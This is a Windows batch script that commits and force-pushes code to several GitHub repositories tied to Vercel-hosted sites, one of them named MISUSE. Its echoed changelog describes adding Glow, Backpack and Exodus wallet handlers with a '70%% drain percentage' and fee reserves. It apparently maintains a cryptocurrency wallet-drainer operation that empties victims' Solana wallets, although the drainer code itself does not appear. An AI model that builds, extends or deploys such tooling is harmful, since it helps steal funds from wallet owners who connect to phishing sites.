@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Adding wallet handlers for Glow, Backpack, and Exodus...
echo.
echo Changes made:
echo - Added Glow wallet handler with Phantom-like fee settings
echo - Added Backpack wallet handler with Phantom-like fee settings
echo - Added Exodus wallet handler with Phantom-like fee settings
echo - Enhanced wallet type detection from user agent
echo - Added detailed debugging logs for wallet detection
echo - All handlers use same transaction structure as Phantom/Solflare
echo.
echo Fee configurations:
echo - Glow: 100,000 fee buffer + 50,000 reserve = 150,000 total
echo - Backpack: 100,000 fee buffer + 50,000 reserve = 150,000 total
echo - Exodus: 100,000 fee buffer + 50,000 reserve = 150,000 total
echo - Solflare: 75,000 fee buffer + 25,000 reserve = 100,000 total (more aggressive)
echo - Phantom: 100,000 fee buffer + 50,000 reserve = 150,000 total (default)
echo.
echo Committing new wallet handlers...
git add .
git commit -m "ADD: Wallet handlers for Glow, Backpack, and Exodus - same transaction structure as Phantom/Solflare"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing new handlers to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! New wallet handlers pushed to all repositories.
echo.
echo Summary:
echo - Glow wallet handler added (150,000 lamports reserved)
echo - Backpack wallet handler added (150,000 lamports reserved)
echo - Exodus wallet handler added (150,000 lamports reserved)
echo - Enhanced wallet type detection and debugging
echo - All handlers use 70%% drain percentage
echo - All handlers use same transaction structure
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo.
echo Test all wallet types:
echo 1. Phantom (already working)
echo 2. Solflare (already working)
echo 3. Glow (newly added)
echo 4. Backpack (newly added)
echo 5. Exodus (newly added)
echo 6. Trust Wallet (already working)
echo.
echo All wallets should now work with proper fee calculations!
pause
